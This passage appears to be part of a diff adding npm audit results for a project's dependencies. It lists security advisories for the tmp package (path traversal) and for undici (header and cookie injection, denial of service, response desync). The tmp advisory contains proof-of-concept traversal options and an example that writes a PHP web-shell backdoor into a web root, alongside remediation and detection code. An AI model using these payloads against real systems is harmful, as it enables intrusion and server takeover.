+      "overview": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `<prefix>-<pid>-<random>-<postfix>`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-<pid>-<random>\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) => {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) => {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '<?php system($_GET[\"cmd\"]); ?>');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) => {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) => {\n    if (!err && options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix && options.prefix.includes('..'),\n      options.postfix && options.postfix.includes('..'),  \n      options.dir && path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* && \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
+      "reported_by": null,
+      "title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44705"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tmp",
+      "vulnerable_versions": "<0.2.6",
+      "github_advisory_id": "GHSA-ph9p-34f9-6g65",
+      "recommendation": "Upgrade to version 0.2.6 or later",
+      "patched_versions": ">=0.2.6",
+      "updated": "2026-06-12T19:25:33.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-ph9p-34f9-6g65"
+    },
+    "1121242": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-9679\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-p88m-4jfj-68fv",
+      "created": "2026-06-19T14:21:30.000Z",
+      "id": 1121242,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nundici's cookie parser in `parseSetCookie` percent-decodes cookie values via `qsUnescape`, turning encoded sequences like `%0D%0A`, `%00`, `%3B`, and `%3D` into their literal byte equivalents. RFC 6265 §5.4 does not specify any decoding and browsers do not decode either.\n\nApplications that parse a `Set-Cookie` header and then forward the parsed value into a response header (proxies, middleware, SSR frameworks) become vulnerable to HTTP response header injection: an attacker-controlled upstream can inject arbitrary `Set-Cookie`, `Location`, or `Cache-Control` headers into the application's downstream response, enabling session fixation, open redirect, or cache poisoning.\n\nAffected applications are those that use undici's cookie parsing (`parseSetCookie`, `parseCookie`, `getSetCookies`) and forward the parsed cookie value into a response header.\n\nThis was introduced in undici 7.0.0 via [#3789](https://github.com/nodejs/undici/pull/3789).\n\n## Patches\n\nUpgrade to undici v6.27.0, v7.28.0 or v8.5.0.\n\n## Workarounds\n\nIf upgrade is not immediately possible, do not forward values returned by `parseSetCookie`/`parseCookie`/`getSetCookies` directly into response headers; sanitize the value first to strip or reject CR, LF, NUL, `;`, and `=` bytes.",
+      "reported_by": null,
+      "title": "undici vulnerable to HTTP header injection via Set-Cookie percent-decoding",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-9679"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.27.0",
+      "github_advisory_id": "GHSA-p88m-4jfj-68fv",
+      "recommendation": "Upgrade to version 6.27.0 or later",
+      "patched_versions": ">=6.27.0",
+      "updated": "2026-06-19T14:23:30.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-93"
+      ],
+      "url": "https://github.com/advisories/GHSA-p88m-4jfj-68fv"
+    },
+    "1121245": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12151\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-vxpw-j846-p89q",
+      "created": "2026-06-19T14:22:01.000Z",
+      "id": 1121245,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nThe undici WebSocket client enforces `maxPayloadSize` on the cumulative byte count of fragments in a message but does not enforce a limit on the number of fragments. A malicious WebSocket server can stream many small or empty continuation frames that each pass per-frame and cumulative-size validation, collectively causing unbounded memory growth in the client process. The result is memory exhaustion and a denial of service.\n\nAffected applications are those using the undici WebSocket client (`new WebSocket(...)`) or the `WebSocketStream` API that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.\n\nAll releases starting at undici 6.17.0 are affected.\n\n## Patches\n\nUpgrade to undici v6.27.0, v7.28.0 or v8.5.0.\n\n## Workarounds\n\nNo workaround is available. The fix must be applied through an upgrade.",
+      "reported_by": null,
+      "title": "undici WebSocket client vulnerable to denial of service via fragment count bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-12151"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.27.0",
+      "github_advisory_id": "GHSA-vxpw-j846-p89q",
+      "recommendation": "Upgrade to version 6.27.0 or later",
+      "patched_versions": ">=6.27.0",
+      "updated": "2026-06-19T14:23:29.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-vxpw-j846-p89q"
+    },
+    "1121255": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-11525\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-g8m3-5g58-fq7m",
+      "created": "2026-06-19T14:34:46.000Z",
+      "id": 1121255,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nWhen undici parses a `Set-Cookie` header, it accepts any `SameSite` attribute value that contains `Strict`, `Lax`, or `None` as a substring, rather than the case-insensitive exact match specified by RFC 6265. Non-spec values are silently mapped to one of the three standard tokens:\n\n- `SameSite=NoneOfYourBusiness` is parsed as `None`, the most permissive setting.\n- `SameSite=StrictLax` is parsed as `Lax`, a downgrade from `Strict`.\n\nAffected applications are those that consume `Set-Cookie` headers from server responses (for example via undici's `fetch` or proxy code paths) and then forward or rely on the parsed `sameSite` attribute. A malicious or non-compliant server can coerce the consumer's view of a cookie's SameSite policy to a weaker value, silently degrading the SameSite enforcement the cookie is supposed to provide.\n\nThis was introduced in undici 5.15.0 when the cookies feature was added.\n\n## Patches\n\nUpgrade to undici v6.27.0, v7.28.0 or v8.5.0.\n\n## Workarounds\n\nAfter parsing a `Set-Cookie` header, validate that the resulting `sameSite` attribute is one of `'Strict'`, `'Lax'`, or `'None'` (exact, case-insensitive) before forwarding or relying on it.",
+      "reported_by": null,
+      "title": "undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-11525"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.27.0",
+      "github_advisory_id": "GHSA-g8m3-5g58-fq7m",
+      "recommendation": "Upgrade to version 6.27.0 or later",
+      "patched_versions": ">=6.27.0",
+      "updated": "2026-06-19T14:34:46.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-183"
+      ],
+      "url": "https://github.com/advisories/GHSA-g8m3-5g58-fq7m"
+    },
+    "1130716": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-8xcm-r25x-g524\n- https://nvd.nist.gov/vuln/detail/CVE-2026-16728\n- https://github.com/nodejs/undici/commit/1b5a5312c3a7d7a30c31bf0d000b39a8a2531e1c\n- https://github.com/nodejs/undici/commit/2b3f749336d356bbbc50192f87f6cf7bc714721a\n- https://github.com/nodejs/undici/commit/4a9dafb16ff43880cf590e6d9c2aeee25fbff6d7\n- https://github.com/nodejs/undici/commit/4fd5a0c61e627f928b7003adc4ffe1e55ec63420\n- https://github.com/nodejs/undici/commit/cba3a52ac2e7abcc4e656d82af8579ea82c2bb9e\n- https://github.com/nodejs/undici/commit/e11a68ed4ff345c79402476f7a00d473443e318d\n- https://hackerone.com/reports/3828685\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.0\n- https://github.com/nodejs/undici/releases/tag/v7.29.0\n- https://github.com/nodejs/undici/releases/tag/v8.9.0\n- https://github.com/advisories/GHSA-8xcm-r25x-g524",
+      "created": "2026-08-03T19:24:33.000Z",
+      "id": 1130716,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUndici's `interceptors.retry()` can deliver a response whose body length does not match the `Content-Length` header exposed to the application after a retry or resume of a partial response. Applications that use `interceptors.retry()` and forward upstream response headers and bodies downstream, for example proxy or gateway applications, may emit an invalid HTTP response with a stale `Content-Length` header. This can lead to downstream response desynchronization, connection hangs, or response corruption in clients or intermediaries that rely on the forwarded framing metadata.\n\nA malicious or faulty upstream can respond to a range request with a `206 Partial Content` response such as:\n\n```http\nContent-Range: bytes 0-99/300\nContent-Length: 300\n```\n\nand then send only 99 bytes before closing the socket. `interceptors.retry()` can then retry with `Range: bytes=99-99`, receive the final byte, and deliver a 100-byte body to the application while the response headers still contain `Content-Length: 300` from the first response.\n\nThe bug requires `interceptors.retry()` to be enabled, an upstream that returns a partial response with a mismatched framing header, and a downstream forwarder that does not remove or recalculate `Content-Length`.\n\n### Patches\n\nPatched in undici v6.28.0, v7.29.0, and v8.9.0. Users should upgrade to one of these versions or later.\n\n### Workarounds\n\n- Disable `interceptors.retry()` for untrusted upstreams.\n- Remove or recalculate `Content-Length` before forwarding a response body assembled or transformed by Undici.",
+      "reported_by": null,
+      "title": "undici vulnerable to downstream response desynchronization via retry interceptor",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-16728"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.0",
+      "github_advisory_id": "GHSA-8xcm-r25x-g524",
+      "recommendation": "Upgrade to version 6.28.0 or later",
+      "patched_versions": ">=6.28.0",
+      "updated": "2026-08-03T19:24:35.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-8xcm-r25x-g524"
+    },
+    "1130727": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-m8rv-5g2x-5cg5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-15157\n- https://github.com/nodejs/undici/commit/33928bc24f742ea8422ed90d17f2e0cc83e4d09d\n- https://github.com/nodejs/undici/commit/740a0b7c173cb4a83a5b693e96e8f3a116cfc400\n- https://github.com/nodejs/undici/commit/7d3cf924c262c486bc77f951348f4e5c847b7b42\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.0\n- https://github.com/nodejs/undici/releases/tag/v7.29.0\n- https://github.com/nodejs/undici/releases/tag/v8.9.0\n- https://github.com/advisories/GHSA-m8rv-5g2x-5cg5",
+      "created": "2026-08-03T19:33:53.000Z",
+      "id": 1130727,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen an application passes a duck-typed blob-like body to undici's HTTP/1.1 dispatcher (via `request()`, `stream()`, `pipeline()`, or `dispatch()`) with a `.type` derived from untrusted input, an attacker can inject CRLF sequences (`\\r\\n`) to append arbitrary HTTP headers and potentially smuggle a second request past the upstream.\n\nThe vulnerable branch in `lib/dispatcher/client-h1.js` pushes `body.type` directly into the outgoing headers with no validation, while every other header path in undici goes through `isValidHeaderValue()`:\n\n```javascript\n} else if (util.isBlobLike(body) && request.contentType == null && body.type) {\n  headers.push('content-type', body.type)  // bypasses isValidHeaderValue()\n}\n```\n\nThe bug requires a hand-rolled duck-typed blob object or a Blob subclass with a controlled `.type`. Native `Blob` is safe because its constructor strips CRLF from `.type`. `fetch()` is unaffected because it validates via the `Headers` class. Ecosystem consumers that build duck-typed blob shapes from user input include `form-data-encoder`, `formdata-polyfill`, and `formdata-node`.\n\nSame defect class as `CVE-2022-35948` (explicit `content-type` sink, fixed in undici 5.8.2) and `CVE-2026-1527` (`upgrade` option sink, fixed in 6.24.0 / 7.24.0), both closed by adding `isValidHeaderValue()` on their respective sinks. This branch was missed.\n\n### Patches\n\nPatched in undici v6.28.0, v7.29.0, and v8.9.0. Users should upgrade to one of these versions or later.\n\n### Workarounds\n\n- Set an explicit, validated `content-type` header on the request options (skips the vulnerable branch).\n- Use a native `Blob` (or `fetch-blob`) instead of a hand-rolled duck-typed object.\n- Reject control characters in the MIME type before assigning it to `.type`.\n- Use `fetch()` instead of the non-`fetch` APIs.",
+      "reported_by": null,
+      "title": "undici vulnerable to CRLF Injection via blob-like body 'type' property",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-15157"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.0",
+      "github_advisory_id": "GHSA-m8rv-5g2x-5cg5",
+      "recommendation": "Upgrade to version 6.28.0 or later",
+      "patched_versions": ">=6.28.0",
+      "updated": "2026-08-03T19:33:56.000Z",
+      "cvss": {
+        "score": 4.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-93"
+      ],
+      "url": "https://github.com/advisories/GHSA-m8rv-5g2x-5cg5"
+    },
+    "1130732": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-v3r7-h72x-cjcm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-16729\n- https://github.com/nodejs/undici/commit/10d93fc332f2c8c161982dec3833201de29891b5\n- https://github.com/nodejs/undici/commit/3bf91ddb493e853957f3a58e155326a668ab8aef\n- https://github.com/nodejs/undici/commit/af7484043ee075a6f216da0ad77e1dac55199235\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.0\n- https://github.com/nodejs/undici/releases/tag/v7.29.0\n- https://github.com/nodejs/undici/releases/tag/v8.9.0\n- https://github.com/advisories/GHSA-v3r7-h72x-cjcm",
+      "created": "2026-08-03T19:30:52.000Z",
+      "id": 1130732,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nThe `setCookie` function has two attribute injection paths. `validateCookieDomain` does not reject semicolons (`validateCookiePath` already does at 0x3B), so a `domain` value like `example.com; SameSite=None` lands verbatim as `Domain=example.com; SameSite=None`. The `unparsed` array's loop only checks each entry contains `=` and does not sanitize values, so an entry like `X-Custom=val; HttpOnly` lands unchanged, injecting `HttpOnly` without the caller setting `cookie.httpOnly = true`.\n\nApplications that pass user-controlled input to these fields, typically multi-tenant or reverse-proxy servers that scope session cookies to a tenant-supplied domain, can have SameSite CSRF protections bypassed, `Secure` or `HttpOnly` forced or stripped, or the intended SameSite tier overridden.\n\n## Patches\n\nPatched in undici v6.28.0, v7.29.0, and v8.9.0.\n\n## Workarounds\n\n- Sanitize `domain` values against the RFC 1034 letter-digit-hyphen set before passing to `setCookie`.\n- Do not pass user-controlled data to the `unparsed` field.",
+      "reported_by": null,
+      "title": "undici vulnerable to cookie attribute injection via unsanitized domain and unparsed setCookie fields",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-16729"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.0",
+      "github_advisory_id": "GHSA-v3r7-h72x-cjcm",
+      "recommendation": "Upgrade to version 6.28.0 or later",
+      "patched_versions": ">=6.28.0",
+      "updated": "2026-08-03T19:30:53.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-v3r7-h72x-cjcm"
+    },
+    "1137243": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-35p6-xmwp-9g52\n- https://nvd.nist.gov/vuln/detail/CVE-2026-6733\n- https://hackerone.com/reports/3582376\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/commit/6ea54ef8c4051e95bb68c89d4a5c9274fe6fbb4b\n- https://github.com/nodejs/undici/releases/tag/v6.27.0\n- https://github.com/nodejs/undici/releases/tag/v7.28.0\n- https://github.com/nodejs/undici/releases/tag/v8.5.0\n- https://github.com/advisories/GHSA-35p6-xmwp-9g52",
+      "created": "2026-06-19T14:19:13.000Z",
+      "id": 1137243,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nUndici's HTTP/1.1 client is vulnerable to response queue poisoning on reused keep-alive sockets. An attacker-controlled upstream server can inject an unsolicited HTTP/1.1 response onto an idle socket after a request completes. When the client dispatches the next request on that socket, it associates the injected response with the new request, causing responses to be delivered to the wrong requests.\n\nThis requires an attacker-controlled or compromised upstream HTTP/1.1 server and keep-alive connection reuse.\n\n## Patches\n\nUpgrade to undici v6.27.0, v7.28.0 or v8.5.0.\n\n## Workarounds\n\nDisable keep-alive connection reuse by setting `keepAliveTimeout: 0` on the Client or Pool.",
+      "reported_by": null,
+      "title": "undici vulnerable to HTTP response queue poisoning via keep-alive socket reuse",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-6733"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.27.0",
+      "github_advisory_id": "GHSA-35p6-xmwp-9g52",
+      "recommendation": "Upgrade to version 6.27.0 or later",
+      "patched_versions": ">=6.27.0",
+      "updated": "2026-08-05T21:48:39.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-367"
+      ],
+      "url": "https://github.com/advisories/GHSA-35p6-xmwp-9g52"
+    },
+    "1145093": {
+      "findings": [
+        {
+          "version": "7.1.5",
+          "paths": [
+            "apps__api>prisma>@prisma/config>deepmerge-ts"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/RebeccaStevens/deepmerge-ts/security/advisories/GHSA-ggr8-5vv4-36mx\n- https://github.com/RebeccaStevens/deepmerge-ts/releases/tag/v8.0.0\n- https://github.com/advisories/GHSA-ggr8-5vv4-36mx",
+      "created": "2026-08-17T13:32:13.000Z",
+      "id": 1145093,
+      "npm_advisory_id": null,
